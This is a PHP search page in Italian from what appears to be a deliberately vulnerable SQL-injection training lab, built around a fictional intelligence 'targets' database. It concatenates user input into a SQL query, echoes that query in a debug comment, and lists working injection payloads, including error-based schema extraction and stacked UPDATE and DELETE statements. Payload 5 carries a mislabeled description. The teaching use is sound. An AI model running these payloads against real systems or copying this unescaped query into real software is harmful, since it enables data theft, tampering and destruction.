<?php
session_start();

if (!isset($_SESSION['user_data'])) {
    header('Location: login.php');
    exit;
}
require_once 'db_config.php';

$results = [];
$search = '';

if (isset($_GET['search'])) {
    $search = $_GET['search'];
    
    $query = "SELECT b.*, 
              c.nome as classificazione
              FROM bersagli b
              JOIN classificazione c ON b.classificazione_id = c.id
              WHERE b.codice_bersaglio LIKE '%$search%' 
              OR b.nome_copertura LIKE '%$search%'
              OR b.nome_reale LIKE '%$search%'
              OR b.organizzazione LIKE '%$search%'";
    
    echo "<!-- DEBUG Query: $query -->";
    
    $results = execute_query($query);
}

$db_error = null;
if (!empty($results) && isset($results[0]['__error'])) {
    $db_error = $results[0]['__error'];
    $results = [];
}

?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ricerca Bersagli</title>
    <link rel="stylesheet" href="/css/common.css">
    <link rel="stylesheet" href="css/search_targets.css">
</head>
<body>
    <div class="container">
        <h1>RICERCA BERSAGLI</h1>
        
        <form method="GET" class="search-form">
            <input type="text" name="search" 
                   placeholder="Cerca bersagli per codice, nome o organizzazione..." 
                   value="<?php echo htmlspecialchars($search); ?>">
            <input type="submit" value="CERCA">
        </form>
        
        <?php if ($results && count($results) > 0): ?>
            <div class="results-count">
                <strong>Risultati trovati: <?php echo count($results); ?> bersagli</strong>
            </div>
            
            <?php foreach ($results as $target): ?>
                <div class="success-box">
                    <div class="card-header">
                        <div class="card-title">
                            <?php echo htmlspecialchars($target['codice_bersaglio'] ?? ''); ?>
                        </div>
                            <?php echo htmlspecialchars($target['livello_minaccia'] ?? 'BASSO'); ?>
                    </div>
                    
                    <div class="user-info">
                        <div class="info-item">
                            <div class="info-label">Nome Copertura</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($target['nome_copertura'] ?? 'N/A'); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Nome Reale</div>
                            <div class="info-value">
                                    <?php echo htmlspecialchars($target['nome_reale'] ?? 'N/A'); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Organizzazione</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($target['organizzazione'] ?? 'N/A'); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Nazionalità</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($target['nazionalita'] ?? 'N/A'); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Classificazione</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($target['classificazione'] ?? 'N/A'); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Livello Minaccia</div>
                            <div class="info-value">
                                <?php if (($target['livello_minaccia'] ?? '') == 'CRITICO'): ?>
                                    <span class="threat-badge">CRITICO</span>
                                <?php else: ?>
                                    <?php echo htmlspecialchars($target['livello_minaccia'] ?? 'BASSO'); ?>
                                <?php endif; ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Telefono</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($target['telefono'] ?? 'N/A'); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Email</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($target['email'] ?? 'N/A'); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Coordinate GPS</div>
                            <div class="info-value">
                                    <?php echo htmlspecialchars($target['coordinate_gps'] ?? 'N/A'); ?>
                            </div>
                        </div>
                </div>
                    
                    <?php if (!empty($target['note_intelligence'])): ?>
                        <div class="message-section">
                            <strong> INTELLIGENCE REPORT:</strong><br>
                            <span class="encrypted-field">
                                <?php echo nl2br(htmlspecialchars($target['note_intelligence'])); ?>
                            </span>
                        </div>
                    <?php endif; ?>
                </div>
            <?php endforeach; ?>
            
        <?php elseif (isset($_GET['search'])): ?>
            <?php if ($db_error): ?>
                <div style="text-align: center; color: #f00; padding: 20px; border: 1px solid #f00; border-radius: 5px; word-wrap: break-word; word-break: break-word; overflow-wrap: break-word; max-width: 100%;">
                    Errore database: "<?php echo htmlspecialchars($db_error); ?>"
                </div>
            <?php endif; ?>
            
            <div style="text-align: center; color: #f00; padding: 20px; border: 1px solid #f00; border-radius: 5px; word-wrap: break-word; word-break: break-word; overflow-wrap: break-word; max-width: 100%;">
                Nessuna comunicazione trovata per: "<?php echo htmlspecialchars($search); ?>"
                <br><br>
                <?php echo htmlspecialchars($query); ?>
            </div>
        <?php endif; ?>
        
        <div class="hints">
            <h3>ISTRUZIONI PER ATTACCO SQL INJECTION</h3>
            
            <strong>1. Mostra la Query:</strong>
            <code>Qualsiasi</code>

            <strong>2. Mostra tutte le operazioni (Tautologia):</strong>
            <code>' OR '1'='1' --</code>

            <strong>3. Lancia Errore per scoprire la struttura tabella (Information Schema):</strong>
            <code>' AND 1=CAST((SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='bersagli') AS INT) --</code>
            
            <strong>3.1. Estrai solo bersagli critici (Filtering):</strong>
            <code>' AND livello_minaccia='CRITICO' --</code>
                        
            <strong>4. Modifica livello minaccia (UPDATE - INTEGRITY):</strong>
            <code>'; UPDATE bersagli SET livello_minaccia='BASSO' WHERE livello_minaccia='CRITICO' --</code>
            
            <strong>5. Scopri struttura tabella (Information Schema):</strong>
            <code>'; DELETE FROM bersagli WHERE '1'='1' --</code>
        </div>
        
        <div class="bottom-buttons">
            <a href="login.php" class="btn1 left">&lt;- Indietro </a>
        </div>
    </div>
</body>
</html>